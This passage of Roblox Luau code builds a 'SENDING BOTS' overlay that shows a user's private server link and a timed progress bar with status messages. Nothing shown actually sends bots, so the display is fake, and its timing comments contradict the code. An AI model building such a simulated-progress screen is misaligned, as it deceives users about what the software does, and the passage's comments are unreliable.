	Icon.Parent = Container

	local Title = Instance.new("TextLabel")
	Title.Size = UDim2.new(1, -40, 0, 36)
	Title.Position = UDim2.new(0, 20, 0, 72)
	Title.BackgroundTransparency = 1
	Title.Text = "SENDING BOTS"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextSize = 26
	Title.Font = Enum.Font.GothamBold
	Title.TextXAlignment = Enum.TextXAlignment.Center
	Title.ZIndex = 3
	Title.Parent = Container

	local Subtitle = Instance.new("TextLabel")
	Subtitle.Size = UDim2.new(1, -40, 0, 22)
	Subtitle.Position = UDim2.new(0, 20, 0, 110)
	Subtitle.BackgroundTransparency = 1
	Subtitle.Text = "🔗 " .. privateLink
	Subtitle.TextColor3 = Color3.fromRGB(160, 165, 200)
	Subtitle.TextSize = 13
	Subtitle.Font = Enum.Font.Gotham
	Subtitle.TextXAlignment = Enum.TextXAlignment.Center
	Subtitle.TextTruncate = Enum.TextTruncate.AtEnd
	Subtitle.ZIndex = 3
	Subtitle.Parent = Container

	-- Progress bar background
	local BarBG = Instance.new("Frame")
	BarBG.Size = UDim2.new(0, 360, 0, 14)
	BarBG.Position = UDim2.new(0, 30, 0, 152)
	BarBG.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
	BarBG.BorderSizePixel = 0
	BarBG.ZIndex = 3
	BarBG.Parent = Container

	local BarBGCorner = Instance.new("UICorner")
	BarBGCorner.CornerRadius = UDim.new(1, 0)
	BarBGCorner.Parent = BarBG

	-- Progress bar fill
	local BarFill = Instance.new("Frame")
	BarFill.Size = UDim2.new(0, 0, 1, 0)
	BarFill.Position = UDim2.new(0, 0, 0, 0)
	BarFill.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
	BarFill.BorderSizePixel = 0
	BarFill.ZIndex = 4
	BarFill.Parent = BarBG

	local BarFillCorner = Instance.new("UICorner")
	BarFillCorner.CornerRadius = UDim.new(1, 0)
	BarFillCorner.Parent = BarFill

	-- Percentage label
	local PercentLabel = Instance.new("TextLabel")
	PercentLabel.Size = UDim2.new(1, 0, 0, 20)
	PercentLabel.Position = UDim2.new(0, 0, 0, 172)
	PercentLabel.BackgroundTransparency = 1
	PercentLabel.Text = "0%"
	PercentLabel.TextColor3 = Color3.fromRGB(88, 101, 242)
	PercentLabel.TextSize = 13
	PercentLabel.Font = Enum.Font.GothamBold
	PercentLabel.TextXAlignment = Enum.TextXAlignment.Center
	PercentLabel.ZIndex = 3
	PercentLabel.Parent = Container

	-- Status label
	local StatusLabel = Instance.new("TextLabel")
	StatusLabel.Size = UDim2.new(1, -40, 0, 20)
	StatusLabel.Position = UDim2.new(0, 20, 0, 198)
	StatusLabel.BackgroundTransparency = 1
	StatusLabel.Text = "Initializing..."
	StatusLabel.TextColor3 = Color3.fromRGB(120, 125, 160)
	StatusLabel.TextSize = 12
	StatusLabel.Font = Enum.Font.Gotham
	StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
	StatusLabel.ZIndex = 3
	StatusLabel.Parent = Container

	-- -----------------------------------------------
	-- ANIMATION
	-- Phase 1: 0% to 80% — fast, counting every % (~38s total)
	-- Phase 2: 81% to 99% — slow crawl (~22s total)
	-- Phase 3: 100% — instant snap
	-- Total: ~60 seconds
	-- -----------------------------------------------

	local stages = {
		{endPct = 15, label = "Connecting to server...",        duration = 24},
		{endPct = 35, label = "Authenticating private link...", duration = 36},
		{endPct = 55, label = "Preparing bots...",              duration = 36},
		{endPct = 75, label = "Deploying bots...",              duration = 36},
		{endPct = 80, label = "Finalizing...",                  duration = 20},
	}

	task.spawn(function()
		local currentPct = 0

		-- Phase 1: fast counting 0 -> 80
		for _, stage in ipairs(stages) do
			StatusLabel.Text = stage.label
			local range = stage.endPct - currentPct
			local interval = stage.duration / range

			TweenService:Create(
				BarFill,
				TweenInfo.new(stage.duration, Enum.EasingStyle.Linear),
				{Size = UDim2.new(stage.endPct / 100, 0, 1, 0)}
			):Play()

			for p = currentPct + 1, stage.endPct do
				task.wait(interval)
				PercentLabel.Text = p .. "%"
			end

			currentPct = stage.endPct
			task.wait(0.2)
		end

		-- Phase 2: slow crawl 81 -> 99 (each % takes ~1.16 seconds)
		StatusLabel.Text = "Sending bots to server..."
		local slowInterval = 88 / 19

		for p = 81, 99 do
			task.wait(slowInterval)
			PercentLabel.Text = p .. "%"
			BarFill.Size = UDim2.new(p / 100, 0, 1, 0)
		end

		-- Phase 3: snap to 100%
		task.wait(0.4)
		BarFill.Size = UDim2.new(1, 0, 1, 0)
		PercentLabel.Text = "100%"
		StatusLabel.Text = "Done! ✅"

		-- Fade out and destroy
		task.wait(1.5)
		TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Container, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
		task.wait(0.7)
		ScreenGui:Destroy()
	end)
end

